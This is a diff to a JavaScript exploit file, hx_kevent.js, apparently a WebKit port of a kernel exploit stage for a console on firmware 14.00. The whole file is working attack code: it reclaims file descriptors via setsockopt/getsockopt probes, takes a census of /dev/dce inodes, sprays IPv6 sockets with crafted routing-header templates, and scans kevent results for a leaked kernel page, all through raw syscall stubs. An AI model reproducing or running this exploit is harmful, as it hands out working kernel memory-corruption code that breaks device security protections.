@@ -3,18 +3,10 @@ import { HX1400_TABLES } from "./hx_tables.js";
 
 // ============================================================================
 // hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
-// Stage 2 (leak scan) — port of bytecode pc 2526-6760:
-//   R0: measure occupied fds (browser baseline)
-//   R:  reclaim stale dce fds (fstat census, st_ino@+4, S_IFCHR, fds 3..37)
-//   B0: anchor + 96 victims
-//   B1: open dce for ino; census 3..37; close stale+orig; plug /dev/null into
-//       vacated slots; warm dce open/close
-//   B:  spray N x socket(AF_INET6,SOCK_DGRAM) armed with CCCC/TTTT template,
-//       N sized so dce opens stay under ~291 ceiling for all 32 tries
-//   scan: per round disarm all -> re-arm all -> per CANDS candidate:
-//         marked() -> open /dev/dce -> kevent(-18 plant) -> sweep victims for
-//         [8]==(int)page && [12]==0 -> joined==1 -> replant flags=2 -> HELD
-// v7: ino@+4 fix, census 3..37, plug loop, adaptive spray sizing vs fd ceiling.
+// v8: full CANDS (all 30: multiples of 8..240), phase R reclaim from pc 3198-3505
+//     (IP_DROP_MEMBERSHIP probe 239.255.255.250 kills leftover victims; 248B
+//      RTHDR getsockopt kills leftover spray; then lowest-free-fd probe).
+// v7: fd ceiling adaptation + B1 census/plug. Earlier: x86 stub rescan.
 // ============================================================================
 
 const T = HX1400_TABLES;
@@ -28,8 +20,9 @@ const NUM = {
   jitshm_create: 533,
   fstat: 189,
 };
+const IPPROTO_IP = 0, IP_DROP_MEMBERSHIP = 13;
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
-const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
+const AF_INET = 2, AF_INET6 = 28, SOCK_DGRAM = 2, SOCK_STREAM = 1;
 const RTH_LEN = 248;
 const TPL_LO = 0x43434343;
 const TPL_HI = 0x54545454;
@@ -39,7 +32,9 @@ const MAX_TRIES = 32;
 const VICTIM_N = 96;
 const SPRAY_FULL = 144;
 const SPRAY_MIN = 128;
-const CANDS = [8, 16, 48, 80, 112, 144, 176, 208, 232, 240];
+// FULL Hx1400.CANDS (clinit, 30 entries): every multiple of 8 from 8 to 240
+const CANDS = [];
+for (let i = 1; i <= 30; i++) CANDS.push(i * 8);
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n };
 
@@ -74,7 +69,6 @@ function allocBuf(size) {
 }
 function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }
 
-// --- x86-64 stub rescan (pattern from jb.js) ---
 let SCAN_SEEN = 0;
 function findStubRaw(snum) {
   const p = ctx().p;
@@ -143,13 +137,11 @@ function scn64(name, a, b, c, d, e, f) {
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
 }
 
-// ---------- stat helpers (FreeBSD amd64: mode short@0, ino u32@+4, rdev@+0x14) ----------
+// stat helpers (mode short@0, ino u32@+4, rdev@+0x14)
 const stBuf = () => allocBuf(256);
 function fstatOk(fd, st) { zeroBuf(st); return scn("fstat", fd, st.addr, 0, 0, 0, 0) === 0; }
 function stIno(st) { return st.dv.getUint32(4, true) >>> 0; }
-function stMode(st) { return st.dv.getUint16(0, true) & 0xffff; }
-function stIsChr(st) { return (stMode(st) & 0xf000) === 0x2000; }
-
+function stIsChr(st) { return (st.dv.getUint16(0, true) & 0xf000) === 0x2000; }
 function mkDev(path) {
   const b = allocBuf(32);
   zeroBuf(b);
@@ -157,28 +149,49 @@ function mkDev(path) {
   return b;
 }
 
-// ---------- R0: measure occupied fds ----------
-function phaseR0() {
-  const st = stBuf();
-  let occ = 0, maxfd = 0;
-  for (let fd = 3; fd < 512; fd++) {
-    if (fstatOk(fd, st)) { occ++; maxfd = fd; }
+// ---------- phase R: reclaim leftovers (bytecode pc 3198-3505) ----------
+function phaseR() {
+  // mreq = { 239.255.255.250, 0.0.0.0 } (ip_mreq, 8 bytes)
+  const mreq = allocBuf(16);
+  zeroBuf(mreq);
+  mreq.dv.setUint32(0, 0xfaffffef, true); // 239.255.255.250 LE
+  mreq.dv.setUint32(4, 0, true);
+  const rdb = allocBuf(1024);
+  const lenp = allocBuf(8);
+  let vics = 0, sprays = 0;
+  for (let fd = 3; fd <= 340; fd++) {
+    let rc = scn("setsockopt", fd, IPPROTO_IP, IP_DROP_MEMBERSHIP, mreq.addr, 8, 0);
+    if (rc === 0) {
+      rc = scn("setsockopt", fd, IPPROTO_IP, IP_DROP_MEMBERSHIP, mreq.addr, 8, 0);
+      if (rc === 0) { if (scn("close", fd) === 0) vics++; }
+      continue;
+    }
+    zeroBuf(rdb);
+    lenp.dv.setUint32(0, 1024, true);
+    lenp.dv.setUint32(4, 0, true);
+    if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) === 0 &&
+        lenp.dv.getUint32(0, true) === RTH_LEN) {
+      if (scn("close", fd) === 0) sprays++;
+    }
   }
-  log("FD-OCCUPIED", "n=" + occ + " maxfd=" + maxfd);
-  return { occupied: occ, maxfd };
+  // lowest free fd probe
+  const probe = scn("socket", AF_INET, SOCK_DGRAM, 0);
+  let lowest = -1;
+  if (probe >= 0) { lowest = probe; scn("close", probe); }
+  log("RECLAIM", "closed vics=" + vics + " sprays=" + sprays + " lowest_free_fd=" + lowest +
+      " (need ~250 below the ~291 ceiling)");
+  return lowest;
 }
 
-// ---------- R+B1: dce inode census (fds 3..37) + plug ----------
-function phaseRB1(dceDev) {
+// ---------- B1: dce inode census (fds 3..37) + plug + warm ----------
+function phaseB1(dceDev) {
   const st = stBuf();
-  // open dce for ino reference
   const dceFd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
   if (dceFd < 0) fin("B1 dce open failed");
   if (!fstatOk(dceFd, st)) fin("B1 dce fstat failed");
   const ino = stIno(st);
   if (ino === 0) fin("our own /dev/dce has no usable st_ino - refusing to guess");
   log("B1", "dce_fd=" + dceFd + " ino=" + h16(BigInt(ino)));
-  // census fds 3..37
   const matches = [];
   for (let fd = 3; fd <= 37; fd++) {
     if (!fstatOk(fd, st)) continue;
@@ -186,20 +199,17 @@ function phaseRB1(dceDev) {
     if (stIno(st) === ino) matches.push(fd);
   }
   log("B1-CENSUS", "matches=" + matches.join(","));
-  // close original + stale
   scn("close", dceFd);
   let closed = 0;
   for (const fd of matches) { if (scn("close", fd) === 0) closed++; }
   log("B1", "closed " + closed + "/" + matches.length + " dce fds (matched by inode, not by rdev)");
-  // plug: reopen /dev/null into each vacated slot
   const nullDev = mkDev("/dev/null");
   let plugged = 0;
   for (const fd of matches) {
     const pfd = scn("open", nullDev.addr, 2, 0, 0, 0, 0);
-    if (pfd >= 0) { if (pfd === fd) plugged++; }
+    if (pfd >= 0 && pfd === fd) plugged++;
   }
   log("B1", "plugged " + plugged + "/" + matches.length + " slots with /dev/null");
-  // warm dce open/close
   const wfd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
   if (wfd >= 0) scn("close", wfd);
   log("B1-WARM", "dce open=" + wfd);
@@ -222,13 +232,12 @@ function phaseB0() {
   return { anchor, victims, highest };
 }
 
-// ---------- B: spray sized to keep dce under ceiling ----------
-function phaseBSpray(tpl, occupiedMax) {
-  // headroom math: after spray, dce opens go up to highest + MAX_TRIES; must stay < FD_CEILING
-  let n = FD_CEILING - MAX_TRIES - 1 - occupiedMax;
+// ---------- B: adaptive spray ----------
+function phaseBSpray(tpl, baseFd) {
+  let n = FD_CEILING - MAX_TRIES - 1 - baseFd;
   if (n > SPRAY_FULL) n = SPRAY_FULL;
   const shrunk = n < SPRAY_FULL;
-  if (n < SPRAY_MIN) { log("B-WARN", "headroom only " + n + " < " + SPRAY_MIN + " — using " + SPRAY_MIN + " (later rounds may bust ceiling)"); n = SPRAY_MIN; }
+  if (n < SPRAY_MIN) { log("B-WARN", "headroom " + n + " < " + SPRAY_MIN + " — using " + SPRAY_MIN); n = SPRAY_MIN; }
   const fds = [];
   let highest = 0, first = 0;
   for (let i = 0; i < n; i++) {
@@ -247,7 +256,6 @@ function phaseBSpray(tpl, occupiedMax) {
   return { fds, highest };
 }
 
-// ---------- template / primitives ----------
 function buildTemplate() {
   const tpl = allocBuf(512);
   zeroBuf(tpl);
@@ -271,7 +279,7 @@ function marked(fd, rdb, lenp) {
          (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
 }
 
-// ---------- scan loop (probe() pc 5773-6760) ----------
+// ---------- scan loop ----------
 function phase2Leak(rootKq, fds, dceDev, tpl) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
@@ -364,12 +372,12 @@ export async function runKevent(c) {
   log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
       num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));
 
-  const r0 = phaseR0();
+  const lowest = phaseR();
   const dceDev = mkDev("/dev/dce");
-  phaseRB1(dceDev);
-  phaseB0();
+  phaseB1(dceDev);
+  const b0 = phaseB0();
   const tpl = buildTemplate();
-  const { fds } = phaseBSpray(tpl, r0.maxfd);
+  const { fds } = phaseBSpray(tpl, Math.max(lowest, b0.highest));
 
   const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
   const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
